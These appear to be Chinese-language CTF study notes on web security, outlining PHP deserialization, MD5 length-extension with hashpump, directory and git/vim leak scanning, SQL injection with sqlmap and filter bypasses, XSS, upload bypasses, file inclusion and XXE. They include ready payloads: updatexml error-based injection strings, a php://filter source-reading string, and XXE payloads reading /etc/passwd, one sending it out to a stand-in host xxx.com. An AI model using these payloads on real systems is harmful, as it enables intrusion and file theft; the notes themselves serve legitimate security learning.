<h1><center>web安全</center></h1>

### 一.隐藏信息
1. 源代码隐藏关键信息
2. 请求和响应头隐藏关键信息

### 二.代码审计

1.1php漏洞

1.1.1 序列化与反序列化

（1）序列化

序列化就是把一个对象（非类）存成一个字符串，要用时再反序列释放出它。
注意序列化只会包含对象的变量，不会包含函数。而且序列化对象后面的字符串不会再反序列化时解析（md5扩展长度攻击时可用）

（2）session序列化

（3）序列化漏洞

当序列化字符串中，表示对象属性个数的值大于实际个数时，在反序列化后就会跳过wakeup方法的执行



1.2 md5扩展长度攻击

介绍：

题目不告诉你key,但提供了data以及md5(key.data)的值

让你求md5(key.data.others)的值



工具：

- HashPump（linux工具），使用方法：hashpump -s [SIGNATURE] -d [DATA] -k [KEY_LENGTH] -a [DATA_ADD]

  通常DATA_ADD可随意指定。



- hashpumpy库(python)





1.3 本地JS代码审计


1.4 修改请求头
Referef:
X-Forwarded-For:
User-Agent:
Accept-Language:

### 三.目录扫描
1. 敏感文件扫描
工具：[dirsearch](https://github.com/maurosoria/dirsearch),御剑

2. git泄露
工具：[GitHack](https://github.com/lijiejie/GitHack),

3. vim泄露
.swp文件

~文件

通过
```
vim -r 交换文件还原
```

### 四.sql注入

sqlmap -u {url} --batch -v {number} --level {number} --dump

1. 基于查询类型划分

    1.1. 数字型注入

    1.2. 字符型注入

2. 基于注入类型划分：

    2.1. union注入

    2.2. 报错注入

    concat(0x3e,(),0x3e)

    updatexml(0x3e,(),0x3e)

    updatexml(0x3e,(concat(0x3e,(sql),0x3e)),0x3e)

    2.3. 盲注

        2.3.1. 布尔盲注
    
        2.3.2. 时间盲注

3. 基于字段划分:

    3.1. get,post参数

    3.2. XFF

    3.3. cookie

    3.4. 基于数据库划分

        3.4.1. mysql
    
        3.4.2. sqlite
    
        3.4.3. access

    3.4.绕过方法
        3.4.1. 空格

        3.4.2. 引号
    
        3.4.3. 注释
         1. 可以用引号连接后面的引号代替注释,and ''=',and '1'='1
         2. %23代替#
         3. --+
         4. /*    */(比较特殊，一般用在双关键字查询)
    
        3.4.4. 关键字
         1. 外重写,select->seleselectct
         2. 内联注释,\/\*!\*\/
    
        3.4.5. 常用函数

### 五.XSS
1. 存储型XSS

2. 反射型XSS

3. DOM型XSS

### 六.文件上传和文件解析
文件上传：
- 本地js
- filename文件后缀名
- Content-Type文件类型
- filename+Content-Type绕过
- 文件内容绕过 图片马，声音马

文件解析


### 八.文件包含
题眼：
page=
file=
action=

主要函数：
include()
require()
file_get_contents()

主要姿势：
php://input 标准输入，post中带输入内容
php://filter/read=convert.base64-encode/resource=文件名   标准输出，输出指定文件内容。
../../ 目录穿越


1. 本地文件包含
引用的是服务器上的文件

2. 远程文件包含
引用的是非服务器上的文件，一般默认关闭


### 九.XXE
XML外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行，内网端口探测、攻击内网网站等目的。


必备条件：
Content-Type: application/xml
post请求中传入poc

一般poc:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo[ 
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<foo>&f;</foo>
```


远程DTD
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://xxx.com/xxe_file.dtd">
<data>&xxe;<data>
```
http://xxx.com/xxe_file.dtd:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "><!ENTITY xxe SYSTEM 'http://xxx.com/?%file;'>">
%all
```
引用自https://www.freebuf.com/articles/web/177979.html

### 十.命令执行
经常flag就在同级目录下面的文件名或者文件中。可以通过ls,cat等命令查看。
或者利用语言所带的查看文件内容和查看目录下文件查看。


### 十一.远程代码执行


